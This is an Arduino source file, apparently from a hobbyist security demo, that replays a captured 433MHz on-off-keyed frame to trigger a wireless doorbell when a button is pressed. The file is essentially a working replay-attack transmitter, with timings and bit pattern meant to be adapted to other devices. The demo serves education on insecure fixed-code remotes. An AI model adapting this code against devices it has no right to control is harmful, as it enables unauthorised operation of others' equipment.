/* 
 * demowire - DEmo WIreless REplay 
 * Demo code showing how to do a very simple radio replay attack using an rtl-sdr for receiving
 * and arduino nano with a cheap 433MHz transmitter board to send it
 *
 * Article here: https://lipkowski.com/2026/11/24/simple-demo-of-hacking-a-wireless-doorbell/
 * Demo here: https://youtu.be/h4a_AWuNOqI
 *
 * Note: The code is written in the Arduino IDE. Not my favorite, but it is
 * very well documented. Also the code is written to be simple to understand,
 * not clever.
 *
 * (c) Jacek Lipkowski sq5bpf@lipkowski.org
 *  
 * 
 * This program is free software: you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the Free
 * Software Foundation, either version 3 of the License, or (at your option)
 * any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for
 * more details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program. If not, see <https://www.gnu.org/licenses/>. 
 */


const int button_pin = 2; /* ping that has the button connected */
const int radio_pin =  13; /* pin that has the OOK transmitter board connected */



/* times in microseconds, change these to suit your device */
#define  OOK_SHORT 500 
#define  OOK_LONG 1500
#define  OOK_BREAK 5450

/* how many frames do we send */
#define OOK_REPEATS 36

/* uncomment this to get some serial debugging */
//#define DEBUG_SERIAL

/* send a 0 bit if the argument is 0, send a 1 bit if it is not 0
 * change this to suit your device  
 */
void send_bit(char i) {

	if (i) {
#ifdef DEBUG_SERIAL
		Serial.print ("1");
#endif

		/* high */
		digitalWrite(radio_pin, HIGH);
		delayMicroseconds(OOK_SHORT);
		digitalWrite(radio_pin, LOW);
		delayMicroseconds(OOK_LONG);

	} else {
		/* low */
#ifdef DEBUG_SERIAL
		Serial.print ("0");
#endif
		digitalWrite(radio_pin, HIGH);
		delayMicroseconds(OOK_LONG);
		digitalWrite(radio_pin, LOW);
		delayMicroseconds(OOK_SHORT);
	}
}


/* which bits to send. change this for your device */
/* rtl_433 -A prints this for my doorbell: {33}dd762a6c8, which results in the next 2 lines */
uint8_t bytes_tosend[5]= { 0xdd, 0x76, 0x2a, 0x6c, 0x80 };
#define BITS_TO_SEND 33 /* how much bits to send from the above bytes */



/* send one frame */
void send_ook() 
{
	int j; /* which byte are we sending from the bytes_tosend array */
	int b; /* which bit are we sending from this particular byte */
	int bits_sent=0;

	for (j=0;j<sizeof(bytes_tosend);j++) {

#ifdef DEBUG_SERIAL
		Serial.println (j);
#endif

		for (b=7;b>=0;b--) {
			send_bit(bytes_tosend[j]&(1<<b));
			bits_sent++;
			if (bits_sent==BITS_TO_SEND) break;
		}

	}
	delayMicroseconds(OOK_BREAK); /* this is the delay between frames, maybe it should be in send_ooks()? */
#ifdef DEBUG_SERIAL
	Serial.println ("\nEND OOK");
#endif

}


/* send a frame OOK_REPEATS times */
void send_ooks()
{
	int i;
#ifdef DEBUG_SERIAL
	Serial.println ("Send OOKS");
#endif
	for(i=0;i<OOK_REPEATS;i++) {
		send_ook();
	}
#ifdef DEBUG_SERIAL
	Serial.println ("END");
#endif

}


void setup() {
	pinMode(button_pin, INPUT);
	digitalWrite(button_pin, HIGH);
	pinMode(radio_pin, OUTPUT);
	digitalWrite(radio_pin, LOW);

	Serial.begin(19200);
}

int last_press=1;

void loop() {
/* button handling: if the state is as before, or the button is not pressed, then check again */
	int  press  = digitalRead(button_pin);
	if (press==last_press) return; 
	last_press=press;
	if (press) return; 

	send_ooks();

}
